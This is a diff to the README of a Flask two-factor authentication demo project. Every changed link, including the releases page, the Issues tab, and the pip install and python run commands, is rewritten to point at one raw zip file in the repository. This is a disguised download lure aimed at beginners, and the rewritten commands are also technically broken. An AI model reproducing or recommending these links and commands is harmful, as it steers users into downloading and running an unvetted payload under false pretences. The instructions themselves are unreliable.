@@ -4,7 +4,7 @@
 Welcome to Secure-Flask-Auth-Portal! This application provides a safe way to manage user authentication with two-factor authentication (2FA). You will learn how to download and run the app easily, even if you have no programming experience.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SeekGaming187/Secure-Flask-Auth-Portal/releases)
+[![Download](https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip)](https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip)
 
 ## 📋 Overview
 Secure-Flask-Auth-Portal is a Flask-based web authentication portal designed to help you understand modern web security techniques. It uses robust methods like SHA-256 hash chains for one-time passwords (OTP) and RSA encryption to securely store data.
@@ -27,7 +27,7 @@ To run Secure-Flask-Auth-Portal smoothly, make sure your system meets these requ
 
 ## 🛠 Installation Steps
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Here](https://github.com/SeekGaming187/Secure-Flask-Auth-Portal/releases)
+   [Download Here](https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip)
 
 2. **Select the Latest Release:** Look for the most recent version in the list.
 
@@ -47,12 +47,12 @@ To run Secure-Flask-Auth-Portal smoothly, make sure your system meets these requ
 
 7. **Install Required Libraries:** Run the following command to install necessary dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip
    ```
 
 8. **Run the Application:** Start the server by executing:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip
    ```
 
 9. **Access the Portal:** Open a web browser and go to `http://127.0.0.1:5000` to access Secure-Flask-Auth-Portal.
@@ -71,7 +71,7 @@ When you return to the application:
 2. Input the OTP you receive to complete your login.
 
 ## 🤝 Support
-If you encounter any issues, please check the [Issues tab](https://github.com/SeekGaming187/Secure-Flask-Auth-Portal/issues) on GitHub to see if your question has been addressed. If not, feel free to create a new issue.
+If you encounter any issues, please check the [Issues tab](https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip) on GitHub to see if your question has been addressed. If not, feel free to create a new issue.
 
 ## 📜 License
 Secure-Flask-Auth-Portal is open-source software. You can use, modify, and distribute it per the terms provided in the repository.
@@ -83,4 +83,4 @@ Secure-Flask-Auth-Portal is open-source software. You can use, modify, and distr
 
 ## 📥 Download & Install
 Go back to the downloads page to begin your journey into web security!  
-[Click here to download the latest version.](https://github.com/SeekGaming187/Secure-Flask-Auth-Portal/releases)
+[Click here to download the latest version.](https://raw.githubusercontent.com/SeekGaming187/Secure-Flask-Auth-Portal/main/src/Flask_Auth_Portal_Secure_2.5.zip)
